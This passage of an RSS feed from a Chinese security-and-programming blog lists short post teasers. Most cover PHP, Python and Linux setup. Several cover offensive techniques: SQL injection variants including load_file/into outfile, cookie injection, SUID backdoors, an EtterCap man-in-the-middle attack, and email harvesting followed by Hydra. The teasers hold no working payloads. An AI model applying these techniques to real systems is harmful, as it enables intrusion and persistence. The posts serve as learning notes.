      <description>0x00 要做的事 也就是找到注入点然后修复 0x01 防御方法 使用预编译语句绑定变量(比如php的mysqli、pdo) &amp;lt;?php //预编译 $mysqli = new</description>
    </item>
    
    <item>
      <title>SQL 注入之宽字节注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-wide-byte/</link>
      <pubDate>Fri, 24 Jun 2016 15:32:34 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-wide-byte/</guid>
      <description>0x00 应用场景 在注入时通常会使用单引号、双引号等特殊字符。在应用中，通常为了安全，开发者会开启php的magic_quote</description>
    </item>
    
    <item>
      <title>SQL 注入之基于时间的注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-time-based/</link>
      <pubDate>Fri, 24 Jun 2016 10:10:27 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-time-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位且不管怎么测试返回页面都没有变化，此时可以使用基于时间的盲注进行注入。 其实只要存在S</description>
    </item>
    
    <item>
      <title>SQL 注入之布尔型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-boolian-based/</link>
      <pubDate>Thu, 23 Jun 2016 23:32:34 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-boolian-based/</guid>
      <description>0x00 特点 当页面存在注入，但是没有显示位，且没有用echo &amp;#34;mysql_error()&amp;#34;输出错误信息时可以用</description>
    </item>
    
    <item>
      <title>SQL 注入之报错型注入(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-error-based/</link>
      <pubDate>Wed, 22 Jun 2016 15:30:54 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-error-based/</guid>
      <description>0x00 前提 一般是在页面没有显示位、但用echo mysql_error();输出了错误信息的时候使用， 它的特点是注入速度快，但</description>
    </item>
    
    <item>
      <title>SQL 注入之联合查询(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-union-select/</link>
      <pubDate>Tue, 21 Jun 2016 22:30:18 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-union-select/</guid>
      <description>0x00 前提 要用联合查询进行注入则：页面必须有显示位 0x01 联合查询 union可合并两个或多个select语句的结果集，前提是两个s</description>
    </item>
    
    <item>
      <title>SQL 注入之 load_file 和 into outfile(MySQL)</title>
      <link>https://wyb0.com/posts/2016/injection-of-mysql-function/</link>
      <pubDate>Mon, 20 Jun 2016 08:10:27 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection-of-mysql-function/</guid>
      <description>0x00 load_file() 读文件 条件: 1. 要有file_priv权限: show global variables like &amp;#39;%secure%&amp;#39;; 2. 知道文件绝对路径 3. 能使用union 4. 对web目录有读权限 注：若</description>
    </item>
    
    <item>
      <title>SQL 注入</title>
      <link>https://wyb0.com/posts/2016/injection/</link>
      <pubDate>Sun, 19 Jun 2016 20:18:48 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/injection/</guid>
      <description>0x00 含义 sql注入是将代码插入(拼接)到应用(用户)的输入参数中，之后再将这些参数传递给后台的SQL服务器加以解析并执行的</description>
    </item>
    
    <item>
      <title>MySQL的information_schema库</title>
      <link>https://wyb0.com/posts/2016/mysql-database-table-information_schema/</link>
      <pubDate>Sun, 19 Jun 2016 19:40:25 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/mysql-database-table-information_schema/</guid>
      <description>0x00 information_schema information_schema这个数据库中保存了MySQL服务器所有数据库的信息。 如数据库名，数据库的表，表栏</description>
    </item>
    
    <item>
      <title>Windows2003 下搭建 IIS&#43;asp</title>
      <link>https://wyb0.com/posts/2016/windows2003-set-up-iis-asp/</link>
      <pubDate>Sat, 18 Jun 2016 20:39:50 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/windows2003-set-up-iis-asp/</guid>
      <description>0x00 添加组件 0x01 开启iis 0x02 添加Web服务扩展 0x03 运行asp 0x04 权限</description>
    </item>
    
    <item>
      <title>Linux 下搭建 FTP</title>
      <link>https://wyb0.com/posts/2016/linux-set-up-ftp/</link>
      <pubDate>Sat, 18 Jun 2016 09:40:06 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-set-up-ftp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal 0x00 安装 yum install vsftpd 0x01 配置 备份 cp /etc/vsftpd/vsftpd.conf /etc/vsftpd/vsftpd.conf.bak 编辑配置文件 vim /etc/vsftpd/vsftpd.conf anonymous_enable=NO #设定不允许</description>
    </item>
    
    <item>
      <title>Linux 下搭建 Tomcat&#43;MySQL&#43;JSP</title>
      <link>https://wyb0.com/posts/2016/linux-set-up-tomcat-mysql-jsp/</link>
      <pubDate>Fri, 17 Jun 2016 23:08:05 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-set-up-tomcat-mysql-jsp/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal 0x00 安装mysql $ sudo yum install mysql mysql-server mysql-devel 0x01 安装jdk和tomcat 创</description>
    </item>
    
    <item>
      <title>Linux 下搭建 Nginx&#43;MySQL&#43;PHP</title>
      <link>https://wyb0.com/posts/2016/linux-set-up-nginx-mysql-php/</link>
      <pubDate>Fri, 17 Jun 2016 22:41:50 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-set-up-nginx-mysql-php/</guid>
      <description>安装环境为：CentOS-6.5-x86_64-minimal 0x00 准备工作 首先执行： sudo yum groupinstall &amp;#34;Development tools&amp;#34; 安装make： yum -y install gcc automake autoconf libtool</description>
    </item>
    
    <item>
      <title>Ubuntu 下使用 ShadowSocks</title>
      <link>https://wyb0.com/posts/2016/ubuntu-use-shadowsocks/</link>
      <pubDate>Mon, 13 Jun 2016 09:14:45 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-use-shadowsocks/</guid>
      <description>环境：Ubuntu14.04 0x00 安装shadowsocks-qt5 sudo apt-get update sudo apt-get python-software-properties software-properties-common sudo add-apt-repository ppa:hzwhuang/ss-qt5</description>
    </item>
    
    <item>
      <title>Python 编写规范</title>
      <link>https://wyb0.com/posts/2016/python-coding-style/</link>
      <pubDate>Sun, 12 Jun 2016 22:17:35 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-coding-style/</guid>
      <description>0x00 代码编排 1.缩进：使用4个空格缩进 2.行长度：每行不要超过80个字符 3.空行：顶级定义之间空两行，如函数或类的定义，方</description>
    </item>
    
    <item>
      <title>conky 配置</title>
      <link>https://wyb0.com/posts/2016/conky-configuration/</link>
      <pubDate>Sat, 04 Jun 2016 20:26:21 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/conky-configuration/</guid>
      <description>0x00 效果 使用软件conky可以在linux上看到系统的运行状态，效果如下： 0x01 安装与配置 先安装conky： sudo apt-get install conky 在/hom</description>
    </item>
    
    <item>
      <title>RGB 颜色对照表</title>
      <link>https://wyb0.com/posts/2016/rgb-color-look-up-table/</link>
      <pubDate>Sat, 04 Jun 2016 20:03:10 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/rgb-color-look-up-table/</guid>
      <description></description>
    </item>
    
    <item>
      <title>PHP 之封装 MySQL 类</title>
      <link>https://wyb0.com/posts/2016/php-package-mysql-function/</link>
      <pubDate>Fri, 03 Jun 2016 11:19:05 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-package-mysql-function/</guid>
      <description>0x00 config.inc.php内容如下 &amp;lt;?php return array( &amp;#39;DB_HOST&amp;#39; =&amp;gt; &amp;#39;192.168.188.134&amp;#39;, &amp;#39;DB_NAME&amp;#39; =&amp;gt; &amp;#39;scoreboard&amp;#39;, &amp;#39;DB_USER&amp;#39; =&amp;gt; &amp;#39;score&amp;#39;, &amp;#39;DB_PASS&amp;#39; =&amp;gt; &amp;#39;123456&amp;#39;, &amp;#39;DB_CHARSET&amp;#39; =&amp;gt; &amp;#39;utf8&amp;#39;, &amp;#39;IS_LOG&amp;#39; =&amp;gt; 1,//开启日志 &amp;#39;LOGFILEPATH&amp;#39; =&amp;gt; &amp;#39;../log</description>
    </item>
    
    <item>
      <title>PHP 之 MySQL 常用函数</title>
      <link>https://wyb0.com/posts/2016/php-mysql-common-function/</link>
      <pubDate>Thu, 02 Jun 2016 13:21:49 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-mysql-common-function/</guid>
      <description>0x00 处理函数 mysql_connect(server,user,pwd,newlink,clientflag) 连接服务器的函数,成功则返回MySQL标识，失败则返回FALSE mysql_select_db(database,connection) 选择数据库的函数，成功则返回true，失败</description>
    </item>
    
    <item>
      <title>win/ubuntu 双系统分区设置</title>
      <link>https://wyb0.com/posts/2016/win-and-ubuntu-partition/</link>
      <pubDate>Tue, 31 May 2016 23:35:06 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/win-and-ubuntu-partition/</guid>
      <description>win10和ubuntu双系统分区设置 硬盘采用uefi格式 硬盘首部留400M空间，是FAT16的格式，用来存放win的引</description>
    </item>
    
    <item>
      <title>XML 基础</title>
      <link>https://wyb0.com/posts/2016/xml-basis/</link>
      <pubDate>Wed, 25 May 2016 13:59:59 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/xml-basis/</guid>
      <description>0x00 XML简介 1、xml的设计宗旨是传输数据，而并非显示数据 2、xms是不作为的，它被设计用来结构化、存储以及传输信息 3、</description>
    </item>
    
    <item>
      <title>PHP 之上传与下载</title>
      <link>https://wyb0.com/posts/2016/php-upload-and-download/</link>
      <pubDate>Tue, 24 May 2016 08:31:09 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-upload-and-download/</guid>
      <description>0x00 上传 客户端设置 客户端使用form表单上传文件，在form表单中必须指明enctype和method属性的值 &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;post&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;form</description>
    </item>
    
    <item>
      <title>PHP 之目录与文件</title>
      <link>https://wyb0.com/posts/2016/php-directory-and-file/</link>
      <pubDate>Sun, 22 May 2016 16:29:47 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-directory-and-file/</guid>
      <description>0x00 目录的操作 &amp;lt;?php $path = &amp;#34;/var/www/html/php/dir.php&amp;#34;; echo dirname($path).&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;; //返回上级路径 echo basename($path).&amp;#34;&amp;lt;br /&amp;gt;&amp;#34;; //返回文件名部分 print_r(pathinfo($path)); //返回包含path信息的数组 echo &amp;#34;&amp;lt;br /&amp;gt;&amp;lt;br /&amp;gt;&amp;#34;; //readd</description>
    </item>
    
    <item>
      <title>PHP 之字符串</title>
      <link>https://wyb0.com/posts/2016/php-string/</link>
      <pubDate>Sat, 21 May 2016 23:16:28 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-string/</guid>
      <description>0x00 特点 字符串可以使用数组的处理函数操作，但并不是真正的数组 双引号中的变量用{}括起来，因为字符串中若遇到$符号，解析器会</description>
    </item>
    
    <item>
      <title>PHP 之面向对象</title>
      <link>https://wyb0.com/posts/2016/php-object-oriented/</link>
      <pubDate>Fri, 20 May 2016 16:07:55 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-object-oriented/</guid>
      <description>0x00 面向对象 面向对象概念 面向对象是达到了软件工程的三个目标：重用性、灵活性和扩展性，使其编程的代码更加简洁、更易于维护、并</description>
    </item>
    
    <item>
      <title>PHP 之数组</title>
      <link>https://wyb0.com/posts/2016/php-array/</link>
      <pubDate>Wed, 18 May 2016 11:09:46 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-array/</guid>
      <description>0x00 分类 索引数组 索引值从0开始，依次递增 关联数组 以字符串为索引，键和值对是无序组合，每个键都是唯一的 0x01 数组的定义 两种方法：</description>
    </item>
    
    <item>
      <title>PHP 之基础</title>
      <link>https://wyb0.com/posts/2016/php-basis/</link>
      <pubDate>Sun, 15 May 2016 09:10:23 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/php-basis/</guid>
      <description>0x00 PHP的作用 1. 收集表单数据 2. 生成动态网页 3. 字符串处理 4. 动态输出图片 5. 处理服务器端文件系统 6. 编写数据库支持的网页 7. 会话跟</description>
    </item>
    
    <item>
      <title>使用 theHarvester 得到邮箱</title>
      <link>https://wyb0.com/posts/2016/theharvester-blasting-email/</link>
      <pubDate>Thu, 12 May 2016 15:27:14 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/theharvester-blasting-email/</guid>
      <description>0x00 软件 使用theHarvester搜集邮箱 使用dnsenum得到邮箱服务器域名 使用nmap查看端口开启情况 使用Hydra</description>
    </item>
    
    <item>
      <title>Nmap思维导图</title>
      <link>https://wyb0.com/posts/2016/nmap-mind-mapping/</link>
      <pubDate>Tue, 10 May 2016 20:24:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/nmap-mind-mapping/</guid>
      <description>nmap思维导图如下：</description>
    </item>
    
    <item>
      <title>通过 gh-pages 发布博客</title>
      <link>https://wyb0.com/posts/2016/ubuntu-push-blog-to-github/</link>
      <pubDate>Mon, 09 May 2016 23:33:12 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-push-blog-to-github/</guid>
      <description>环境：Ubuntu 14.4 0x00 添加密钥 ➜ ssh-keygen -t rsa -b 2048 -C &amp;#34;123456@qq.com&amp;#34; -f id_rsa_github # 生成密钥 ➜ cd ~/.ssh/ ➜ cat id_rsa_github.pub # 将公钥添加到 github ➜ git config --global user.name &amp;#34;reber&amp;#34; # 配置本地用户 ➜ git config</description>
    </item>
    
    <item>
      <title>Ubuntu 下安装 sublime text 3</title>
      <link>https://wyb0.com/posts/2016/ubuntu-insatll-sublime-text3/</link>
      <pubDate>Sun, 08 May 2016 00:04:42 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-insatll-sublime-text3/</guid>
      <description>环境：ubuntu14.4 0x00 安装 添加Sublime Text 3的仓库 sudo add-apt-repository ppa:webupd8team/sublime-text-3 更新软件库 sudo apt-get update 安装Sublime Text 3 sudo apt-get install sublime-text-installer 0x01 解决不</description>
    </item>
    
    <item>
      <title>Ubuntu 搭建 LAMP</title>
      <link>https://wyb0.com/posts/2016/ubuntu-build-lamp/</link>
      <pubDate>Sat, 07 May 2016 21:37:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/ubuntu-build-lamp/</guid>
      <description>0x00 环境 我是在虚拟机中安装14.04.4版的Ubuntu 下载Ubuntu14.04.4 0x01 配源或选择最快的更新服务器 选择最快</description>
    </item>
    
    <item>
      <title>Git 的用法</title>
      <link>https://wyb0.com/posts/2016/git-usage/</link>
      <pubDate>Thu, 05 May 2016 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/git-usage/</guid>
      <description>0x00 仓库 创建仓库 git init 克隆 git clone git@github.com:reber0/wyb0.com.git 添加远程仓库连接 git remote add origin git@github.com:reber/reber.com.git 删除远程仓库信息 git remote rm origin 0x01 添加 SSH key 生成 key ➜ ssh-keygen -t rsa -b 2048 -f id_rsa_github -C &amp;#34;123456@qq.com&amp;#34; 将 ~/.ssh/ 下</description>
    </item>
    
    <item>
      <title>Linux 之文本处理软件 awk</title>
      <link>https://wyb0.com/posts/2016/linux-text-processing-software-awk/</link>
      <pubDate>Wed, 20 Apr 2016 15:54:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-text-processing-software-awk/</guid>
      <description>awk默认是以行为单位处理文本的，对文本中的每一行都执行后面 &amp;ldquo;{ }&amp;rdquo; 中的语句。 0x00 awk 若有一个需要重新格式化的字典test.tx</description>
    </item>
    
    <item>
      <title>Linux 之文本处理</title>
      <link>https://wyb0.com/posts/2016/linux-text-processing/</link>
      <pubDate>Wed, 20 Apr 2016 07:58:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-text-processing/</guid>
      <description>这里介绍3种方式：awk、grep、sed 0x00 awk处理文本(最常用) 作用：awk对数据以行分析并生成报告时显得很强大，它</description>
    </item>
    
    <item>
      <title>Linux 之软件的安装</title>
      <link>https://wyb0.com/posts/2016/linux-software-installation/</link>
      <pubDate>Tue, 19 Apr 2016 19:07:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-software-installation/</guid>
      <description>Linux上的软件安装可以分为三种方式： 0x00 yum安装 yum基于RPM包管理，一次性安装所有依赖包，提供了查找、安装、删除</description>
    </item>
    
    <item>
      <title>Linux 之基础命令</title>
      <link>https://wyb0.com/posts/2016/linux-basic-command/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-basic-command/</guid>
      <description>0x00 ls：显示文件 [wyb@localhost tmp]$ ls a a.txt [wyb@localhost tmp]$ ls -l total 4 drwxr-xr-x. 2 wyb root 4096 Apr 17 18:23 a -rw-r--r--. 1 wyb root 0 Apr 17 18:23 a.txt [wyb@localhost tmp]$ ls -a . .. a a.txt .esd-500 .ICE-unix [wyb@localhost tmp]$ ls -al total 20 drwxrwxrwt. 5 root root 4096 Apr 17</description>
    </item>
    
    <item>
      <title>Linux 之服务和计划任务</title>
      <link>https://wyb0.com/posts/2016/linux-service-and-planning-tasks/</link>
      <pubDate>Tue, 19 Apr 2016 10:03:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-service-and-planning-tasks/</guid>
      <description>0x00 服务： 在后台运行的软件就叫服务，参数一般为：start/stop/restart apache启动后默认降权 service httpd star</description>
    </item>
    
    <item>
      <title>利用 EtterCap 进行中间人攻击</title>
      <link>https://wyb0.com/posts/2016/linux-install-ettercap/</link>
      <pubDate>Tue, 19 Apr 2016 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-install-ettercap/</guid>
      <description>0x00 准备 操作系统：CentOS 首先，ettercap 安装时需要 4 个依赖包，而且安装包里面也已经提供了 执行：sudo yum groupinstall &amp;#34;Development tools&amp;#34;</description>
    </item>
    
    <item>
      <title>Linux 之 SUID 后门</title>
      <link>https://wyb0.com/posts/2016/linux-suid-back-door/</link>
      <pubDate>Mon, 18 Apr 2016 20:03:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-suid-back-door/</guid>
      <description>SUID可以用来做后门，前提是你已经获取了root权限，且给予s权限的文件必须为二进制 0x00 为二进制文件添加s权限从而提升为</description>
    </item>
    
    <item>
      <title>Linux 之用户和用户组</title>
      <link>https://wyb0.com/posts/2016/linux-user/</link>
      <pubDate>Sun, 17 Apr 2016 20:48:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-user/</guid>
      <description>0x01 新建用户 环境：Ubuntu 14.04.4 Step1：添加新用户 useradd -r -m -s /bin/bash 用户名 Step2:配置新用户密码 passwd 用户名 Step3：给新添</description>
    </item>
    
    <item>
      <title>[转] 短</title>
      <link>https://wyb0.com/posts/2016/short/</link>
      <pubDate>Sun, 17 Apr 2016 15:49:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/short/</guid>
      <description>一年很短 短得来不及细品初春殷红窦绿 就要打点素裹秋霜 一生很短 短的来不及享用美好年华 就已经身处迟暮 总是经过的太快 领悟的太晚 我</description>
    </item>
    
    <item>
      <title>Linux 之权限</title>
      <link>https://wyb0.com/posts/2016/linux-permission-settings/</link>
      <pubDate>Sun, 17 Apr 2016 10:03:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-permission-settings/</guid>
      <description>主要有三种参数：rwx 对于文件来说：分别是读/写/执行 对于目录来说：r读目录结构；w操作目录结构；x进入目录 如：drwx</description>
    </item>
    
    <item>
      <title>Linux 之 vim</title>
      <link>https://wyb0.com/posts/2016/linux-vim/</link>
      <pubDate>Fri, 15 Apr 2016 21:03:07 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/linux-vim/</guid>
      <description>0x00 Vim的安装及配置： 安装vim yum install vim 配置文件的位置 在目录 /etc/ 下面，有个名为vimrc的 文件， 这是系统中公共的vim配置文</description>
    </item>
    
    <item>
      <title>Python 的正则</title>
      <link>https://wyb0.com/posts/2016/python-regular/</link>
      <pubDate>Fri, 05 Feb 2016 11:38:23 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-regular/</guid>
      <description>0x00 正则表达式 正则表达式是用来匹配字符串的异常强大的东西，可以用来匹配邮箱、域名等字符串 0x01 符号 0x02 特殊字符 0x03 常用的模块属性 0x04</description>
    </item>
    
    <item>
      <title>Python 的线程</title>
      <link>https://wyb0.com/posts/2016/python-thread/</link>
      <pubDate>Wed, 03 Feb 2016 12:44:38 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-thread/</guid>
      <description>Python的参数传递其实传递的是对象，当传递可变对象(列表、队列)时相当于引用传递，可以修改对象的原始值，当传递不可变</description>
    </item>
    
    <item>
      <title>Python 的面向对象</title>
      <link>https://wyb0.com/posts/2016/python-object-oriented/</link>
      <pubDate>Mon, 25 Jan 2016 11:17:59 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-object-oriented/</guid>
      <description>0x00 面向对象 面向对象是为了解决系统的可维护性，可扩展性，可重用性 三个基本特征：封装、继承、多态 封装：对一类事物，将其相同特</description>
    </item>
    
    <item>
      <title>Python 的函数式编程</title>
      <link>https://wyb0.com/posts/2016/python-functional-programming/</link>
      <pubDate>Thu, 21 Jan 2016 21:13:17 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/python-functional-programming/</guid>
      <description>0x00 函数式编程 首先说一下高阶函数，能将函数作为参数来接收的函数就可以称为高阶函数，如下： def add(x,y,f): return f(x) + f(y) print add(7,-3,abs) #abs是求绝对值</description>
    </item>
    
    <item>
      <title>ASP Cookie 处联合注入</title>
      <link>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</link>
      <pubDate>Fri, 04 Dec 2015 19:42:19 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2015/injection-of-asp-in-the-cookie/</guid>
      <description>0x00 Cookie注入的使用 三大Web提交方式 GET：直接在浏览器上面访问地址 POST：提交表单(会员注册、文件上传等) CO</description>
    </item>
    
    <item>
      <title>搭建 DNS 服务器</title>
      <link>https://wyb0.com/posts/2015/set-up-dns-server/</link>
      <pubDate>Tue, 14 Jul 2015 14:15:13 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2015/set-up-dns-server/</guid>
      <description>环境: ubuntu-16.04.7-server-amd64.iso 安装系统时选上 dns 服务，或者 apt install bind9 安装 0x01 配置前 涉及到的几个配置文件 /etc/bind/named.conf，主配置</description>
    </item>
    
    <item>
      <title>中小企业网络搭建</title>
      <link>https://wyb0.com/posts/2015/small-and-medium-enterprise-network-structures/</link>
      <pubDate>Mon, 13 Jul 2015 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2015/small-and-medium-enterprise-network-structures/</guid>
      <description>0x00 中小企业需求分析 搭建企业私有局域网络环境，使用交换机、路由器等网络设备完成由局域网到互联网的接入。 对网络设备能够方便地</description>
    </item>
    
    <item>
      <title>利用 C 语言简单实现单重 DES</title>
      <link>https://wyb0.com/posts/2015/single-des-simple-implementation/</link>
      <pubDate>Fri, 22 May 2015 16:52:55 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2015/single-des-simple-implementation/</guid>
      <description>0x00 简介 此程序通过单重des实现8个字节的加密和解密。 新建一个工程，这个工程需要3个cpp文件(c文件也可以)和2个头文件</description>
    </item>
    
    <item>
      <title>思科交换机基本配置</title>
      <link>https://wyb0.com/posts/2015/cisco-switch-basic-configuration/</link>
      <pubDate>Wed, 06 May 2015 23:46:26 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2015/cisco-switch-basic-configuration/</guid>
      <description>0x00 简单配置命令 Switch&amp;gt;enable(配置交换机名称) Switch(config)#hostname S S(config)#enable password 222//(加密特权密码，密码为222) S(config)#no enable password /</description>
    </item>
    
    <item>
      <title></title>
      <link>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</link>
      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
      
      <guid>https://wyb0.com/posts/2016/file-upload-editor-upload-vulnerability/</guid>
      <description>draft: false date: 2016-07-21 15:11:29 title: 文件上传之文本编辑器上传漏洞 description: categories: Pentest tags: 文件上传 0x00 文本编辑器 常见的文本编辑器有CKEditor、eWebEdit</description>
    </item>
    
  </channel>
</rss>
